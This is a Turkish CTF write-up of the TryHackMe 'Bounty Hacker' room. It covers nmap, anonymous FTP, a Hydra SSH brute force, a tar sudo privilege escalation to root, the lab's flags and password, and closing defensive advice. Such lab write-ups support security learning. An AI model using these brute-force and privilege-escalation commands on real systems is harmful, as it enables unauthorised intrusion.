# Bounty Hacker (TryHackMe)

**Platform:** TryHackMe
**Zorluk:** Easy
**Konu:** FTP enumeration, Hydra brute force, tar privilege escalation

## Saldırı Zinciri

### 1. Keşif — nmap

```bash
nmap -sC -sV <HEDEF_IP>
```

Açık portlar:
- **21/tcp** — FTP (vsFTPd 3.0.5)
- **22/tcp** — SSH (OpenSSH 8.2p1)
- **80/tcp** — HTTP (Apache 2.4.41)

### 2. FTP — Anonymous Login

```bash
ftp <HEDEF_IP>
# Kullanıcı: anonymous / Şifre: boş
```

İki dosya buldum:
- `task.txt` — sunucuyu kimin deploy ettiğini söylüyor → **lin**
- `locks.txt` — olası şifrelerin listesi (wordlist)

```bash
get task.txt
get locks.txt
```

### 3. Hydra — SSH Brute Force

FTP'den elde ettiğim bilgilerle SSH'ı brute force:

```bash
hydra -l lin -P locks.txt ssh://<HEDEF_IP>
```

Sonuç: `lin:RedDr4gonSynd1cat3`

### 4. SSH Girişi — User Flag

```bash
ssh lin@<HEDEF_IP>
cat ~/Desktop/user.txt
```

User flag: `THM{CR1M3_SyNd1C4T3}`

### 5. Privilege Escalation — tar

```bash
sudo -l
# (root) NOPASSWD: /bin/tar
```

GTFOBins'ten tar privesc:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Root shell! Flag:

```bash
cat /root/root.txt
```

Root flag: `THM{80UN7Y_h4cK3r}`

## Öğrendiğim Şeyler

1. **FTP anonymous login** her zaman kontrol edilmeli — sızan dosyalar asıl saldırıyı başlatıyor.
2. **Hydra** ile brute force yaparken, hedeften elde edilen wordlist (`locks.txt`) genel wordlist'ten çok daha etkili.
3. **`sudo -l`** shell alınca ilk refleks olmalı — tar gibi masum görünen araçlar bile root shell verebilir.
4. **GTFOBins** vazgeçilmez: `tar --checkpoint-action` ile komut çalıştırma, normal kullanımda akla gelmeyen bir özellik.

## Geliştirici Notu

- FTP anonymous erişimi kapatılmalı veya hassas dosyalar FTP dizininde tutulmamalı.
- SSH brute force'a karşı: fail2ban, rate limiting, key-based auth.
- `sudo` yetkisi verilirken GTFOBins kontrol edilmeli — tar gibi araçlar shell spawn edebilir.
